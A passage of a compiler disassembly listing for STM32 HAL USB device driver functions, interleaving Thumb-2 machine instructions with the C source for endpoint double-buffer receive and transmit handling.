 8002c50:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c52:	695a      	ldr	r2, [r3, #20]
 8002c54:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c58:	441a      	add	r2, r3
 8002c5a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c5c:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002c5e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c60:	69da      	ldr	r2, [r3, #28]
 8002c62:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c66:	441a      	add	r2, r3
 8002c68:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c6a:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002c6c:	687b      	ldr	r3, [r7, #4]
 8002c6e:	681b      	ldr	r3, [r3, #0]
 8002c70:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002c72:	4618      	mov	r0, r3
 8002c74:	f003 fec3 	bl	80069fe <USB_EPStartXfer>
 8002c78:	e006      	b.n	8002c88 <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002c7a:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002c7e:	461a      	mov	r2, r3
 8002c80:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002c82:	6878      	ldr	r0, [r7, #4]
 8002c84:	f000 f917 	bl	8002eb6 <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002c88:	687b      	ldr	r3, [r7, #4]
 8002c8a:	681b      	ldr	r3, [r3, #0]
 8002c8c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002c90:	b29b      	uxth	r3, r3
 8002c92:	b21b      	sxth	r3, r3
 8002c94:	2b00      	cmp	r3, #0
 8002c96:	f6ff ac45 	blt.w	8002524 <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002c9a:	2300      	movs	r3, #0
}
 8002c9c:	4618      	mov	r0, r3
 8002c9e:	3758      	adds	r7, #88	; 0x58
 8002ca0:	46bd      	mov	sp, r7
 8002ca2:	bd80      	pop	{r7, pc}

08002ca4 <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002ca4:	b580      	push	{r7, lr}
 8002ca6:	b088      	sub	sp, #32
 8002ca8:	af00      	add	r7, sp, #0
 8002caa:	60f8      	str	r0, [r7, #12]
 8002cac:	60b9      	str	r1, [r7, #8]
 8002cae:	4613      	mov	r3, r2
 8002cb0:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002cb2:	88fb      	ldrh	r3, [r7, #6]
 8002cb4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002cb8:	2b00      	cmp	r3, #0
 8002cba:	d07c      	beq.n	8002db6 <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002cbc:	68fb      	ldr	r3, [r7, #12]
 8002cbe:	681b      	ldr	r3, [r3, #0]
 8002cc0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002cc4:	b29b      	uxth	r3, r3
 8002cc6:	461a      	mov	r2, r3
 8002cc8:	68bb      	ldr	r3, [r7, #8]
 8002cca:	781b      	ldrb	r3, [r3, #0]
 8002ccc:	00db      	lsls	r3, r3, #3
 8002cce:	4413      	add	r3, r2
 8002cd0:	68fa      	ldr	r2, [r7, #12]
 8002cd2:	6812      	ldr	r2, [r2, #0]
 8002cd4:	4413      	add	r3, r2
 8002cd6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002cda:	881b      	ldrh	r3, [r3, #0]
 8002cdc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ce0:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002ce2:	68bb      	ldr	r3, [r7, #8]
 8002ce4:	699a      	ldr	r2, [r3, #24]
 8002ce6:	8b7b      	ldrh	r3, [r7, #26]
 8002ce8:	429a      	cmp	r2, r3
 8002cea:	d306      	bcc.n	8002cfa <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002cec:	68bb      	ldr	r3, [r7, #8]
 8002cee:	699a      	ldr	r2, [r3, #24]
 8002cf0:	8b7b      	ldrh	r3, [r7, #26]
 8002cf2:	1ad2      	subs	r2, r2, r3
 8002cf4:	68bb      	ldr	r3, [r7, #8]
 8002cf6:	619a      	str	r2, [r3, #24]
 8002cf8:	e002      	b.n	8002d00 <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002cfa:	68bb      	ldr	r3, [r7, #8]
 8002cfc:	2200      	movs	r2, #0
 8002cfe:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002d00:	68bb      	ldr	r3, [r7, #8]
 8002d02:	699b      	ldr	r3, [r3, #24]
 8002d04:	2b00      	cmp	r3, #0
 8002d06:	d123      	bne.n	8002d50 <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002d08:	68fb      	ldr	r3, [r7, #12]
 8002d0a:	681b      	ldr	r3, [r3, #0]
 8002d0c:	461a      	mov	r2, r3
 8002d0e:	68bb      	ldr	r3, [r7, #8]
 8002d10:	781b      	ldrb	r3, [r3, #0]
 8002d12:	009b      	lsls	r3, r3, #2
 8002d14:	4413      	add	r3, r2
 8002d16:	881b      	ldrh	r3, [r3, #0]
 8002d18:	b29b      	uxth	r3, r3
 8002d1a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002d1e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002d22:	833b      	strh	r3, [r7, #24]
 8002d24:	8b3b      	ldrh	r3, [r7, #24]
 8002d26:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002d2a:	833b      	strh	r3, [r7, #24]
 8002d2c:	68fb      	ldr	r3, [r7, #12]
 8002d2e:	681b      	ldr	r3, [r3, #0]
 8002d30:	461a      	mov	r2, r3
 8002d32:	68bb      	ldr	r3, [r7, #8]
 8002d34:	781b      	ldrb	r3, [r3, #0]
 8002d36:	009b      	lsls	r3, r3, #2
 8002d38:	441a      	add	r2, r3
 8002d3a:	8b3b      	ldrh	r3, [r7, #24]
 8002d3c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002d40:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002d44:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002d48:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002d4c:	b29b      	uxth	r3, r3
 8002d4e:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002d50:	88fb      	ldrh	r3, [r7, #6]
 8002d52:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002d56:	2b00      	cmp	r3, #0
 8002d58:	d01f      	beq.n	8002d9a <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002d5a:	68fb      	ldr	r3, [r7, #12]
 8002d5c:	681b      	ldr	r3, [r3, #0]
 8002d5e:	461a      	mov	r2, r3
 8002d60:	68bb      	ldr	r3, [r7, #8]
 8002d62:	781b      	ldrb	r3, [r3, #0]
 8002d64:	009b      	lsls	r3, r3, #2
 8002d66:	4413      	add	r3, r2
 8002d68:	881b      	ldrh	r3, [r3, #0]
 8002d6a:	b29b      	uxth	r3, r3
 8002d6c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002d70:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002d74:	82fb      	strh	r3, [r7, #22]
 8002d76:	68fb      	ldr	r3, [r7, #12]
 8002d78:	681b      	ldr	r3, [r3, #0]
 8002d7a:	461a      	mov	r2, r3
 8002d7c:	68bb      	ldr	r3, [r7, #8]
 8002d7e:	781b      	ldrb	r3, [r3, #0]
 8002d80:	009b      	lsls	r3, r3, #2
 8002d82:	441a      	add	r2, r3
 8002d84:	8afb      	ldrh	r3, [r7, #22]
 8002d86:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002d8a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002d8e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002d92:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002d96:	b29b      	uxth	r3, r3
 8002d98:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002d9a:	8b7b      	ldrh	r3, [r7, #26]
 8002d9c:	2b00      	cmp	r3, #0
 8002d9e:	f000 8085 	beq.w	8002eac <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002da2:	68fb      	ldr	r3, [r7, #12]
 8002da4:	6818      	ldr	r0, [r3, #0]
 8002da6:	68bb      	ldr	r3, [r7, #8]
 8002da8:	6959      	ldr	r1, [r3, #20]
 8002daa:	68bb      	ldr	r3, [r7, #8]
 8002dac:	891a      	ldrh	r2, [r3, #8]
 8002dae:	8b7b      	ldrh	r3, [r7, #26]
 8002db0:	f005 fb73 	bl	800849a <USB_ReadPMA>
 8002db4:	e07a      	b.n	8002eac <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002db6:	68fb      	ldr	r3, [r7, #12]
 8002db8:	681b      	ldr	r3, [r3, #0]
 8002dba:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002dbe:	b29b      	uxth	r3, r3
 8002dc0:	461a      	mov	r2, r3
 8002dc2:	68bb      	ldr	r3, [r7, #8]
 8002dc4:	781b      	ldrb	r3, [r3, #0]
 8002dc6:	00db      	lsls	r3, r3, #3
 8002dc8:	4413      	add	r3, r2
 8002dca:	68fa      	ldr	r2, [r7, #12]
 8002dcc:	6812      	ldr	r2, [r2, #0]
 8002dce:	4413      	add	r3, r2
 8002dd0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002dd4:	881b      	ldrh	r3, [r3, #0]
 8002dd6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002dda:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002ddc:	68bb      	ldr	r3, [r7, #8]
 8002dde:	699a      	ldr	r2, [r3, #24]
 8002de0:	8b7b      	ldrh	r3, [r7, #26]
 8002de2:	429a      	cmp	r2, r3
 8002de4:	d306      	bcc.n	8002df4 <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 8002de6:	68bb      	ldr	r3, [r7, #8]
 8002de8:	699a      	ldr	r2, [r3, #24]
 8002dea:	8b7b      	ldrh	r3, [r7, #26]
 8002dec:	1ad2      	subs	r2, r2, r3
 8002dee:	68bb      	ldr	r3, [r7, #8]
 8002df0:	619a      	str	r2, [r3, #24]
 8002df2:	e002      	b.n	8002dfa <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8002df4:	68bb      	ldr	r3, [r7, #8]
 8002df6:	2200      	movs	r2, #0
 8002df8:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002dfa:	68bb      	ldr	r3, [r7, #8]
 8002dfc:	699b      	ldr	r3, [r3, #24]
 8002dfe:	2b00      	cmp	r3, #0
 8002e00:	d123      	bne.n	8002e4a <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002e02:	68fb      	ldr	r3, [r7, #12]
 8002e04:	681b      	ldr	r3, [r3, #0]
 8002e06:	461a      	mov	r2, r3
 8002e08:	68bb      	ldr	r3, [r7, #8]
 8002e0a:	781b      	ldrb	r3, [r3, #0]
 8002e0c:	009b      	lsls	r3, r3, #2
 8002e0e:	4413      	add	r3, r2
 8002e10:	881b      	ldrh	r3, [r3, #0]
 8002e12:	b29b      	uxth	r3, r3
 8002e14:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002e18:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002e1c:	83fb      	strh	r3, [r7, #30]
 8002e1e:	8bfb      	ldrh	r3, [r7, #30]
 8002e20:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002e24:	83fb      	strh	r3, [r7, #30]
 8002e26:	68fb      	ldr	r3, [r7, #12]
 8002e28:	681b      	ldr	r3, [r3, #0]
 8002e2a:	461a      	mov	r2, r3
 8002e2c:	68bb      	ldr	r3, [r7, #8]
 8002e2e:	781b      	ldrb	r3, [r3, #0]
 8002e30:	009b      	lsls	r3, r3, #2
 8002e32:	441a      	add	r2, r3
 8002e34:	8bfb      	ldrh	r3, [r7, #30]
 8002e36:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002e3a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002e3e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002e42:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002e46:	b29b      	uxth	r3, r3
 8002e48:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 8002e4a:	88fb      	ldrh	r3, [r7, #6]
 8002e4c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002e50:	2b00      	cmp	r3, #0
 8002e52:	d11f      	bne.n	8002e94 <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002e54:	68fb      	ldr	r3, [r7, #12]
 8002e56:	681b      	ldr	r3, [r3, #0]
 8002e58:	461a      	mov	r2, r3
 8002e5a:	68bb      	ldr	r3, [r7, #8]
 8002e5c:	781b      	ldrb	r3, [r3, #0]
 8002e5e:	009b      	lsls	r3, r3, #2
 8002e60:	4413      	add	r3, r2
 8002e62:	881b      	ldrh	r3, [r3, #0]
 8002e64:	b29b      	uxth	r3, r3
 8002e66:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002e6a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002e6e:	83bb      	strh	r3, [r7, #28]
 8002e70:	68fb      	ldr	r3, [r7, #12]
 8002e72:	681b      	ldr	r3, [r3, #0]
 8002e74:	461a      	mov	r2, r3
 8002e76:	68bb      	ldr	r3, [r7, #8]
 8002e78:	781b      	ldrb	r3, [r3, #0]
 8002e7a:	009b      	lsls	r3, r3, #2
 8002e7c:	441a      	add	r2, r3
 8002e7e:	8bbb      	ldrh	r3, [r7, #28]
 8002e80:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002e84:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002e88:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002e8c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002e90:	b29b      	uxth	r3, r3
 8002e92:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002e94:	8b7b      	ldrh	r3, [r7, #26]
 8002e96:	2b00      	cmp	r3, #0
 8002e98:	d008      	beq.n	8002eac <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002e9a:	68fb      	ldr	r3, [r7, #12]
 8002e9c:	6818      	ldr	r0, [r3, #0]
 8002e9e:	68bb      	ldr	r3, [r7, #8]
 8002ea0:	6959      	ldr	r1, [r3, #20]
 8002ea2:	68bb      	ldr	r3, [r7, #8]
 8002ea4:	895a      	ldrh	r2, [r3, #10]
 8002ea6:	8b7b      	ldrh	r3, [r7, #26]
 8002ea8:	f005 faf7 	bl	800849a <USB_ReadPMA>
    }
  }

  return count;
 8002eac:	8b7b      	ldrh	r3, [r7, #26]
}
 8002eae:	4618      	mov	r0, r3
 8002eb0:	3720      	adds	r7, #32
 8002eb2:	46bd      	mov	sp, r7
 8002eb4:	bd80      	pop	{r7, pc}

08002eb6 <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002eb6:	b580      	push	{r7, lr}
 8002eb8:	b0a4      	sub	sp, #144	; 0x90
 8002eba:	af00      	add	r7, sp, #0
 8002ebc:	60f8      	str	r0, [r7, #12]
 8002ebe:	60b9      	str	r1, [r7, #8]
 8002ec0:	4613      	mov	r3, r2
 8002ec2:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002ec4:	88fb      	ldrh	r3, [r7, #6]
 8002ec6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002eca:	2b00      	cmp	r3, #0
 8002ecc:	f000 81db 	beq.w	8003286 <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002ed0:	68fb      	ldr	r3, [r7, #12]
 8002ed2:	681b      	ldr	r3, [r3, #0]
 8002ed4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002ed8:	b29b      	uxth	r3, r3
 8002eda:	461a      	mov	r2, r3
 8002edc:	68bb      	ldr	r3, [r7, #8]
 8002ede:	781b      	ldrb	r3, [r3, #0]
 8002ee0:	00db      	lsls	r3, r3, #3
 8002ee2:	4413      	add	r3, r2
 8002ee4:	68fa      	ldr	r2, [r7, #12]
 8002ee6:	6812      	ldr	r2, [r2, #0]
 8002ee8:	4413      	add	r3, r2
 8002eea:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002eee:	881b      	ldrh	r3, [r3, #0]
 8002ef0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ef4:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 8002ef8:	68bb      	ldr	r3, [r7, #8]
 8002efa:	699a      	ldr	r2, [r3, #24]
 8002efc:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f00:	429a      	cmp	r2, r3
 8002f02:	d907      	bls.n	8002f14 <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 8002f04:	68bb      	ldr	r3, [r7, #8]
 8002f06:	699a      	ldr	r2, [r3, #24]
 8002f08:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f0c:	1ad2      	subs	r2, r2, r3
 8002f0e:	68bb      	ldr	r3, [r7, #8]
 8002f10:	619a      	str	r2, [r3, #24]
 8002f12:	e002      	b.n	8002f1a <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8002f14:	68bb      	ldr	r3, [r7, #8]
 8002f16:	2200      	movs	r2, #0
 8002f18:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 8002f1a:	68bb      	ldr	r3, [r7, #8]
 8002f1c:	699b      	ldr	r3, [r3, #24]
 8002f1e:	2b00      	cmp	r3, #0
 8002f20:	f040 80b9 	bne.w	8003096 <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002f24:	68bb      	ldr	r3, [r7, #8]
 8002f26:	785b      	ldrb	r3, [r3, #1]
 8002f28:	2b00      	cmp	r3, #0
 8002f2a:	d126      	bne.n	8002f7a <HAL_PCD_EP_DB_Transmit+0xc4>
 8002f2c:	68fb      	ldr	r3, [r7, #12]
 8002f2e:	681b      	ldr	r3, [r3, #0]
 8002f30:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002f32:	68fb      	ldr	r3, [r7, #12]
 8002f34:	681b      	ldr	r3, [r3, #0]
 8002f36:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f3a:	b29b      	uxth	r3, r3
 8002f3c:	461a      	mov	r2, r3
 8002f3e:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002f40:	4413      	add	r3, r2
 8002f42:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002f44:	68bb      	ldr	r3, [r7, #8]
 8002f46:	781b      	ldrb	r3, [r3, #0]
 8002f48:	00da      	lsls	r2, r3, #3
 8002f4a:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002f4c:	4413      	add	r3, r2
 8002f4e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f52:	62bb      	str	r3, [r7, #40]	; 0x28
 8002f54:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f56:	881b      	ldrh	r3, [r3, #0]
 8002f58:	b29b      	uxth	r3, r3
 8002f5a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f5e:	b29a      	uxth	r2, r3
 8002f60:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f62:	801a      	strh	r2, [r3, #0]
 8002f64:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f66:	881b      	ldrh	r3, [r3, #0]
 8002f68:	b29b      	uxth	r3, r3
 8002f6a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002f6e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002f72:	b29a      	uxth	r2, r3
 8002f74:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f76:	801a      	strh	r2, [r3, #0]
 8002f78:	e01a      	b.n	8002fb0 <HAL_PCD_EP_DB_Transmit+0xfa>
 8002f7a:	68bb      	ldr	r3, [r7, #8]
 8002f7c:	785b      	ldrb	r3, [r3, #1]
 8002f7e:	2b01      	cmp	r3, #1
 8002f80:	d116      	bne.n	8002fb0 <HAL_PCD_EP_DB_Transmit+0xfa>
 8002f82:	68fb      	ldr	r3, [r7, #12]
 8002f84:	681b      	ldr	r3, [r3, #0]
 8002f86:	637b      	str	r3, [r7, #52]	; 0x34
 8002f88:	68fb      	ldr	r3, [r7, #12]
 8002f8a:	681b      	ldr	r3, [r3, #0]
 8002f8c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f90:	b29b      	uxth	r3, r3
 8002f92:	461a      	mov	r2, r3
 8002f94:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002f96:	4413      	add	r3, r2
 8002f98:	637b      	str	r3, [r7, #52]	; 0x34
 8002f9a:	68bb      	ldr	r3, [r7, #8]
 8002f9c:	781b      	ldrb	r3, [r3, #0]
 8002f9e:	00da      	lsls	r2, r3, #3
 8002fa0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002fa2:	4413      	add	r3, r2
 8002fa4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002fa8:	633b      	str	r3, [r7, #48]	; 0x30
 8002faa:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002fac:	2200      	movs	r2, #0
 8002fae:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002fb0:	68fb      	ldr	r3, [r7, #12]
 8002fb2:	681b      	ldr	r3, [r3, #0]
 8002fb4:	627b      	str	r3, [r7, #36]	; 0x24
 8002fb6:	68bb      	ldr	r3, [r7, #8]
 8002fb8:	785b      	ldrb	r3, [r3, #1]
 8002fba:	2b00      	cmp	r3, #0
 8002fbc:	d126      	bne.n	800300c <HAL_PCD_EP_DB_Transmit+0x156>
 8002fbe:	68fb      	ldr	r3, [r7, #12]
 8002fc0:	681b      	ldr	r3, [r3, #0]
 8002fc2:	61fb      	str	r3, [r7, #28]
 8002fc4:	68fb      	ldr	r3, [r7, #12]
 8002fc6:	681b      	ldr	r3, [r3, #0]
 8002fc8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002fcc:	b29b      	uxth	r3, r3
 8002fce:	461a      	mov	r2, r3
 8002fd0:	69fb      	ldr	r3, [r7, #28]
 8002fd2:	4413      	add	r3, r2
 8002fd4:	61fb      	str	r3, [r7, #28]
 8002fd6:	68bb      	ldr	r3, [r7, #8]
 8002fd8:	781b      	ldrb	r3, [r3, #0]
 8002fda:	00da      	lsls	r2, r3, #3
 8002fdc:	69fb      	ldr	r3, [r7, #28]
 8002fde:	4413      	add	r3, r2
 8002fe0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002fe4:	61bb      	str	r3, [r7, #24]
 8002fe6:	69bb      	ldr	r3, [r7, #24]
 8002fe8:	881b      	ldrh	r3, [r3, #0]
 8002fea:	b29b      	uxth	r3, r3
 8002fec:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ff0:	b29a      	uxth	r2, r3
 8002ff2:	69bb      	ldr	r3, [r7, #24]
 8002ff4:	801a      	strh	r2, [r3, #0]
 8002ff6:	69bb      	ldr	r3, [r7, #24]
 8002ff8:	881b      	ldrh	r3, [r3, #0]
 8002ffa:	b29b      	uxth	r3, r3
 8002ffc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003000:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003004:	b29a      	uxth	r2, r3
 8003006:	69bb      	ldr	r3, [r7, #24]
 8003008:	801a      	strh	r2, [r3, #0]
 800300a:	e017      	b.n	800303c <HAL_PCD_EP_DB_Transmit+0x186>
 800300c:	68bb      	ldr	r3, [r7, #8]
 800300e:	785b      	ldrb	r3, [r3, #1]
 8003010:	2b01      	cmp	r3, #1
 8003012:	d113      	bne.n	800303c <HAL_PCD_EP_DB_Transmit+0x186>
 8003014:	68fb      	ldr	r3, [r7, #12]
 8003016:	681b      	ldr	r3, [r3, #0]
 8003018:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800301c:	b29b      	uxth	r3, r3
 800301e:	461a      	mov	r2, r3
 8003020:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8003022:	4413      	add	r3, r2
 8003024:	627b      	str	r3, [r7, #36]	; 0x24
 8003026:	68bb      	ldr	r3, [r7, #8]
 8003028:	781b      	ldrb	r3, [r3, #0]
 800302a:	00da      	lsls	r2, r3, #3
 800302c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800302e:	4413      	add	r3, r2
 8003030:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003034:	623b      	str	r3, [r7, #32]
 8003036:	6a3b      	ldr	r3, [r7, #32]
 8003038:	2200      	movs	r2, #0
 800303a:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 800303c:	68bb      	ldr	r3, [r7, #8]
 800303e:	781b      	ldrb	r3, [r3, #0]
 8003040:	4619      	mov	r1, r3
 8003042:	68f8      	ldr	r0, [r7, #12]
 8003044:	f009 fc49 	bl	800c8da <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003048:	88fb      	ldrh	r3, [r7, #6]
 800304a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800304e:	2b00      	cmp	r3, #0
 8003050:	f000 82fa 	beq.w	8003648 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003054:	68fb      	ldr	r3, [r7, #12]
 8003056:	681b      	ldr	r3, [r3, #0]
 8003058:	461a      	mov	r2, r3
 800305a:	68bb      	ldr	r3, [r7, #8]
 800305c:	781b      	ldrb	r3, [r3, #0]
 800305e:	009b      	lsls	r3, r3, #2
 8003060:	4413      	add	r3, r2
 8003062:	881b      	ldrh	r3, [r3, #0]
 8003064:	b29b      	uxth	r3, r3
 8003066:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800306a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800306e:	82fb      	strh	r3, [r7, #22]
 8003070:	68fb      	ldr	r3, [r7, #12]
 8003072:	681b      	ldr	r3, [r3, #0]
 8003074:	461a      	mov	r2, r3
 8003076:	68bb      	ldr	r3, [r7, #8]
 8003078:	781b      	ldrb	r3, [r3, #0]
 800307a:	009b      	lsls	r3, r3, #2
 800307c:	441a      	add	r2, r3
 800307e:	8afb      	ldrh	r3, [r7, #22]
 8003080:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
